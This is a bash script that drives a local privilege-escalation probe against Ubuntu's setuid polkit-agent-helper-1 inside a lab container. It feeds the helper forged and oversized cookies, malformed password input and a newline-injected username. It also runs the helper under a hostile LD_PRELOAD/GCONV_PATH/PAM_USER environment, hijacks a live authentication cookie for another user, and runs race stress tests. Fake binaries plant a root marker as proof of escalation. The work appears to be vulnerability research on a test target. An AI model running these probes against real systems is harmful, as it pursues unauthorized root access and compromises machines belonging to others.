#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/polkit-agent-helper-direct.out"

mkdir -p "$repo_dir/logs"
tmp_log="$(mktemp "$repo_dir/logs/polkit-agent-helper-direct.out.tmp.XXXXXX")"

docker exec -i "$container" bash -s >"$tmp_log" 2>&1 <<'TARGET'
set +e
export LC_ALL=C

WORK=/tmp/polkit-agent-helper-direct
USER_NAME=selfauth
USER_PASS=selfauth
HELPER=/usr/lib/polkit-1/polkit-agent-helper-1
ROOT_MARKER=/root/polkit_agent_helper_direct_root

section() {
  printf '\n## %s\n' "$1"
}

run_root() {
  local label="$1"
  shift
  section "$label"
  printf '$'
  printf ' %q' "$@"
  printf '\n'
  "$@"
  local rc=$?
  printf 'rc=%s\n' "$rc"
}

run_user_cmd() {
  local label="$1"
  local timeout_s="$2"
  local cmd="$3"
  section "$label"
  printf '$ runuser -u %s -- timeout %ss bash -lc %q\n' "$USER_NAME" "$timeout_s" "$cmd"
  timeout "$timeout_s" runuser -u "$USER_NAME" -- bash -lc "$cmd"
  local rc=$?
  printf 'rc=%s\n' "$rc"
  sha256sum /etc/shadow 2>/dev/null | sed 's/^/shadow_hash_after_case /'
}

state_snapshot() {
  for p in \
    /etc/passwd /etc/shadow /etc/group /etc/gshadow \
    /etc/environment /etc/default/locale /etc/security/pam_env.conf \
    /usr/lib/pam.d/polkit-1 /etc/pam.d/common-auth /etc/pam.d/common-account \
    /etc/pam.d/common-session /etc/pam.d/common-session-noninteractive; do
    if [ -e "$p" ]; then
      stat -Lc 'stat %A %a %U:%G %s %n' "$p" 2>&1
      sha256sum "$p" 2>/dev/null || true
    else
      echo "missing $p"
    fi
  done
  find /var/lib/polkit-1 /etc/polkit-1 /usr/share/polkit-1/rules.d -maxdepth 2 \
    -printf 'tree %m %u:%g %p\n' 2>/dev/null | sort
}

rm -rf "$WORK"
mkdir -p "$WORK/fakebin" "$WORK/gconv" "$WORK/home"
chmod 0777 "$WORK" "$WORK/fakebin" "$WORK/gconv" "$WORK/home"
rm -f "$ROOT_MARKER" /tmp/polkit_agent_helper_direct_fakebin

if ! id "$USER_NAME" >/dev/null 2>&1; then
  useradd -m -s /bin/bash "$USER_NAME"
fi
echo "$USER_NAME:$USER_PASS" | chpasswd
usermod -G "$USER_NAME" "$USER_NAME"

for name in sh bash dash dbus-daemon dbus-send systemctl pkcheck id touch env; do
  {
    printf '#!/bin/sh\n'
    printf '/usr/bin/id > /tmp/polkit_agent_helper_direct_fakebin 2>/dev/null || true\n'
    printf '/usr/bin/touch %s 2>/dev/null || true\n' "$ROOT_MARKER"
    printf 'exit 97\n'
  } >"$WORK/fakebin/$name"
  chmod 0755 "$WORK/fakebin/$name"
  chown "$USER_NAME:$USER_NAME" "$WORK/fakebin/$name"
done
chown -R "$USER_NAME:$USER_NAME" "$WORK"

section "target default identity/package/setuid reachability"
{
  sed -n '1,12p' /etc/os-release
  uname -a
  id "$USER_NAME"
  getent group sudo admin adm shadow root | sed 's/^/group: /' || true
  passwd -S "$USER_NAME" 2>&1 || true
  dpkg-query -W -f='${binary:Package}\t${Version}\t${Architecture}\t${db:Status-Abbrev}\n' \
    polkitd pkexec policykit-1 libpolkit-agent-1-0 libpolkit-gobject-1-0 \
    libpam0g libpam-modules libpam-modules-bin dbus systemd strace 2>&1
  ls -li /usr/lib/polkit-1/polkit-agent-helper-1 \
    /usr/lib/policykit-1/polkit-agent-helper-1 \
    /usr/libexec/polkit-agent-helper-1 2>&1
  stat -Lc '%n mode=%a perms=%A owner=%U:%G uid=%u gid=%g size=%s type=%F' "$HELPER"
  sha256sum "$HELPER"
  runuser -u "$USER_NAME" -- test -x "$HELPER"
  echo "selfauth_can_execute_helper_rc=$?"
} 2>&1

section "polkit PAM service and binary protocol strings"
{
  sed -n '1,200p' /usr/lib/pam.d/polkit-1
  echo "--- common-auth"
  sed -n '1,160p' /etc/pam.d/common-auth
  echo "--- common-account"
  sed -n '1,160p' /etc/pam.d/common-account
  echo "--- common-session-noninteractive"
  sed -n '1,160p' /etc/pam.d/common-session-noninteractive
  echo "--- helper strings"
  if command -v strings >/dev/null 2>&1; then
    strings -a "$HELPER"
  else
    HELPER="$HELPER" python3 - <<'PY'
import os
path = os.environ["HELPER"]
data = open(path, "rb").read()
buf = bytearray()
for b in data:
    if 32 <= b < 127:
        buf.append(b)
    else:
        if len(buf) >= 4:
            print(buf.decode("ascii", "ignore"))
        buf.clear()
if len(buf) >= 4:
    print(buf.decode("ascii", "ignore"))
PY
  fi | egrep -i 'PAM_|SUCCESS|FAILURE|cookie|PolicyKit|polkit|pam_|auth|uid|tty|response|session|exec|system' || true
} 2>&1

section "polkit default action/auth inventory"
python3 - <<'PY' 2>&1
import glob
import xml.etree.ElementTree as ET

auth_self = []
focus = []
for path in sorted(glob.glob("/usr/share/polkit-1/actions/*.policy")):
    root = ET.parse(path).getroot()
    for action in root.findall("action"):
        aid = action.get("id")
        vals = {}
        for key in ("allow_any", "allow_inactive", "allow_active"):
            node = action.find("defaults/" + key)
            vals[key] = (node.text or "").strip() if node is not None else ""
        if any("auth_self" in v for v in vals.values()):
            auth_self.append((aid, path, vals))
        if aid in {
            "org.freedesktop.systemd1.manage-units",
            "org.freedesktop.systemd1.manage-unit-files",
            "org.freedesktop.policykit.exec",
        } or aid.startswith("org.freedesktop.policykit."):
            focus.append((aid, path, vals))

print("[auth_self_actions]")
if auth_self:
    for aid, path, vals in auth_self:
        print(f"{aid}\t{path}\tany={vals['allow_any']} inactive={vals['allow_inactive']} active={vals['allow_active']}")
else:
    print("none")

print("[focus_actions]")
for aid, path, vals in sorted(focus):
    print(f"{aid}\t{path}\tany={vals['allow_any']} inactive={vals['allow_inactive']} active={vals['allow_active']}")
PY

section "root-owned state before direct helper probes"
state_snapshot | tee "$WORK/pre_state"

run_user_cmd "argc guard: no arguments" 4 "'$HELPER'"
run_user_cmd "argc guard: username without cookie" 4 "printf 'selfauth\n' | '$HELPER' selfauth"
run_user_cmd "tty stdin guard" 5 "script -qfec 'timeout 3s $HELPER selfauth fakecookie' /dev/null </dev/null"

run_user_cmd "valid PAM password with fake cookie" 8 "printf 'selfauth\n' | '$HELPER' selfauth fakecookie"
run_user_cmd "wrong PAM password with fake cookie" 8 "printf 'bad\n' | '$HELPER' selfauth fakecookie"
run_user_cmd "root username with selfauth password" 8 "printf 'selfauth\n' | '$HELPER' root fakecookie"
run_user_cmd "nonexistent username" 8 "printf 'selfauth\n' | '$HELPER' doesnotexist fakecookie"
run_user_cmd "newline in username argv" 8 "printf 'selfauth\n' | '$HELPER' \$'selfauth\nroot' fakecookie"
run_user_cmd "empty cookie" 8 "printf 'selfauth\n' | '$HELPER' selfauth ''"
run_user_cmd "action id used as cookie: systemd manage-units" 8 "printf 'selfauth\n' | '$HELPER' selfauth org.freedesktop.systemd1.manage-units"
run_user_cmd "action id used as cookie: policykit exec" 8 "printf 'selfauth\n' | '$HELPER' selfauth org.freedesktop.policykit.exec"
run_user_cmd "long cookie" 8 "cookie=\$(python3 - <<'PY'
print('C' * 4096)
PY
); printf 'selfauth\n' | '$HELPER' selfauth \"\$cookie\""

run_user_cmd "stdin parse: password without newline" 8 "printf 'selfauth' | '$HELPER' selfauth fakecookie"
run_user_cmd "stdin parse: extra response lines" 8 "printf 'selfauth\nEXTRA\n' | '$HELPER' selfauth fakecookie"
run_user_cmd "stdin parse: embedded NUL before suffix" 8 "python3 - <<'PY' | '$HELPER' selfauth fakecookie
import sys
sys.stdout.buffer.write(b'selfauth\\0after\\n')
PY"
run_user_cmd "stdin parse: oversized response" 8 "python3 - <<'PY' | '$HELPER' selfauth fakecookie
print('A' * 8192)
PY"

run_user_cmd "hostile environment/PAM env side-effect probe" 8 "printf 'selfauth\n' | env -i PATH='$WORK/fakebin:/usr/bin:/bin' HOME='$WORK/home' USER=selfauth LOGNAME=selfauth SHELL='$WORK/fakebin/sh' GCONV_PATH='$WORK/gconv' CHARSET=POLKITHELPERTEST LD_PRELOAD='$WORK/fake.so' LD_AUDIT='$WORK/audit.so' PAM_USER=root '$HELPER' selfauth fakecookie"

section "pkcheck baseline for admin-gated action as selfauth"
runuser -u "$USER_NAME" -- bash -lc "pkcheck --action-id org.freedesktop.systemd1.manage-units --process \$\$; echo pkcheck_no_interaction_rc=\$?"
runuser -u "$USER_NAME" -- timeout 5s bash -lc "pkcheck --action-id org.freedesktop.systemd1.manage-units --process \$\$ --allow-user-interaction; echo pkcheck_interaction_rc=\$?"

section "real cookie/action binding via minimal authentication agent"
cat >"$WORK/agent_check.py" <<'PY'
#!/usr/bin/python3
import dbus
import dbus.service
import dbus.mainloop.glib
import os
import threading
from gi.repository import GLib

work = "/tmp/polkit-agent-helper-direct"
log = open(work + "/agent.log", "a", buffering=1)

def start_time(pid):
    with open(f"/proc/{pid}/stat") as f:
        return int(f.read().split()[21])

class Agent(dbus.service.Object):
    @dbus.service.method(
        "org.freedesktop.PolicyKit1.AuthenticationAgent",
        in_signature="sssa{ss}sa(sa{sv})",
        out_signature="",
    )
    def BeginAuthentication(self, action_id, message, icon_name, details, cookie, identities):
        log.write(
            "BEGIN action=%s cookie=%s identities=%r details=%r\n"
            % (action_id, cookie, identities, dict(details))
        )
        with open(work + "/live_cookie", "w") as f:
            f.write(str(cookie))

    @dbus.service.method(
        "org.freedesktop.PolicyKit1.AuthenticationAgent",
        in_signature="s",
        out_signature="",
    )
    def CancelAuthentication(self, cookie):
        log.write("CANCEL cookie=%s\n" % cookie)

dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
bus = dbus.SystemBus()
agent = Agent(bus, "/org/example/PolkitAgentHelperDirect")
authority = bus.get_object(
    "org.freedesktop.PolicyKit1", "/org/freedesktop/PolicyKit1/Authority"
)
iface = dbus.Interface(authority, "org.freedesktop.PolicyKit1.Authority")
pid = os.getpid()
uid = os.getuid()
subject = (
    "unix-process",
    {
        "pid": dbus.UInt32(pid),
        "start-time": dbus.UInt64(start_time(pid)),
        "uid": dbus.Int32(uid),
    },
)
iface.RegisterAuthenticationAgent(subject, "en_US.UTF-8", "/org/example/PolkitAgentHelperDirect")
log.write("REGISTERED self pid=%d uid=%d\n" % (pid, uid))
loop = GLib.MainLoop()

def check_authorization():
    try:
        result = iface.CheckAuthorization(
            subject,
            "org.freedesktop.systemd1.manage-units",
            {},
            dbus.UInt32(1),
            "",
        )
        log.write("CHECK_RESULT %r\n" % (result,))
        with open(work + "/check_result", "w") as f:
            f.write(repr(result))
    except Exception as e:
        log.write("CHECK_ERROR %r\n" % e)
        with open(work + "/check_result", "w") as f:
            f.write("ERROR " + repr(e))
    finally:
        GLib.timeout_add(500, loop.quit)

threading.Thread(target=check_authorization, daemon=True).start()
GLib.timeout_add_seconds(8, loop.quit)
loop.run()
PY
chmod 0755 "$WORK/agent_check.py"
chown "$USER_NAME:$USER_NAME" "$WORK/agent_check.py"
rm -f "$WORK/live_cookie" "$WORK/agent.log" "$WORK/check_result" "$WORK/agent_stdout"
runuser -u "$USER_NAME" -- timeout 12s "$WORK/agent_check.py" >"$WORK/agent_stdout" 2>&1 &
agent_pid=$!
for _ in $(seq 1 50); do
  [ -s "$WORK/live_cookie" ] && break
  sleep 0.1
done
cookie="$(cat "$WORK/live_cookie" 2>/dev/null)"
printf 'captured_cookie=%s\n' "${cookie:-<none>}"
if [ -n "$cookie" ]; then
  printf 'selfauth\n' | runuser -u "$USER_NAME" -- timeout 6s "$HELPER" ubuntu "$cookie" >"$WORK/live_cookie_ubuntu.out" 2>&1
  printf 'live_cookie_ubuntu_rc=%s\n' "$?"
  sed -n '1,80p' "$WORK/live_cookie_ubuntu.out"
  printf 'selfauth\n' | runuser -u "$USER_NAME" -- timeout 6s "$HELPER" "$USER_NAME" "$cookie" >"$WORK/live_cookie_selfauth.out" 2>&1
  printf 'live_cookie_selfauth_rc=%s\n' "$?"
  sed -n '1,80p' "$WORK/live_cookie_selfauth.out"
fi
wait "$agent_pid"
printf 'agent_process_rc=%s\n' "$?"
echo "--- agent stdout"
sed -n '1,120p' "$WORK/agent_stdout" 2>/dev/null
echo "--- agent log"
sed -n '1,160p' "$WORK/agent.log" 2>/dev/null
echo "--- agent check result"
sed -n '1,40p' "$WORK/check_result" 2>/dev/null

section "concurrent fake-cookie race stress"
rm -f "$WORK"/race-*.out "$WORK"/race-*.rc
for i in $(seq 1 24); do
  (
    printf 'selfauth\n' | runuser -u "$USER_NAME" -- timeout 5s "$HELPER" "$USER_NAME" "race-cookie-$i" >"$WORK/race-$i.out" 2>&1
    printf '%s %s\n' "$i" "$?" >"$WORK/race-$i.rc"
  ) &
done
wait
sort -n "$WORK"/race-*.rc
grep -hE 'SUCCESS|FAILURE|error response|pam_|wrong|No session|identity' "$WORK"/race-*.out | sort | uniq -c
printf 'success_count=%s\n' "$(grep -h '^SUCCESS$' "$WORK"/race-*.out 2>/dev/null | wc -l)"

section "interrupted prompt race"
( sleep 0.5; printf 'selfauth\n' ) | runuser -u "$USER_NAME" -- timeout 0.2s "$HELPER" "$USER_NAME" slow-cookie >"$WORK/interrupted.out" 2>&1
printf 'interrupted_rc=%s\n' "$?"
sed -n '1,80p' "$WORK/interrupted.out"

section "strace of valid-PAM fake-cookie path for root-side writes/exec"
rm -f "$WORK/helper.strace" "$WORK/helper.strace.out"
printf 'selfauth\n' | strace -f -qq -o "$WORK/helper.strace" -s 200 \
  -e trace=execve,execveat,openat,creat,rename,renameat,renameat2,unlink,unlinkat,symlink,symlinkat,link,linkat,mkdir,mkdirat,rmdir,chmod,fchmod,fchmodat,chown,fchown,fchownat,lchown,setxattr,lsetxattr,fsetxattr,connect,sendmsg,recvmsg \
  -u "$USER_NAME" "$HELPER" "$USER_NAME" fakecookie >"$WORK/helper.strace.out" 2>&1
printf 'strace_helper_rc=%s\n' "$?"
echo "--- helper stdout/stderr under strace"
sed -n '1,120p' "$WORK/helper.strace.out"
echo "--- trace first 220 lines"
sed -n '1,220p' "$WORK/helper.strace"
echo "--- trace write/exec/connect summary"
egrep 'execve|execveat|O_WRONLY|O_RDWR|O_CREAT|rename|unlink|symlink|link|mkdir|rmdir|chmod|chown|setxattr|connect|sendmsg' "$WORK/helper.strace" | sed -n '1,220p'

section "root-owned state after probes"
state_snapshot | tee "$WORK/post_state"
echo "--- snapshot diff"
diff -u "$WORK/pre_state" "$WORK/post_state" || true

section "root proof and cleanup"
if [ -e "$ROOT_MARKER" ]; then
  echo "ROOT_PROOF=yes"
  ls -l "$ROOT_MARKER"
  cat "$ROOT_MARKER" 2>/dev/null || true
else
  echo "ROOT_PROOF=no"
fi
if [ -e /tmp/polkit_agent_helper_direct_fakebin ]; then
  echo "fakebin_executed=yes"
  cat /tmp/polkit_agent_helper_direct_fakebin
else
  echo "fakebin_executed=no"
fi
rm -rf "$WORK"
rm -f "$ROOT_MARKER" /tmp/polkit_agent_helper_direct_fakebin
echo "cleanup_leftovers:"
find /tmp /root -maxdepth 1 \( -name 'polkit-agent-helper-direct' -o -name 'polkit_agent_helper_direct*' \) -print 2>/dev/null
exit 0
TARGET

mv "$tmp_log" "$log_path"
chmod 0644 "$log_path"
printf 'wrote %s\n' "$log_path"
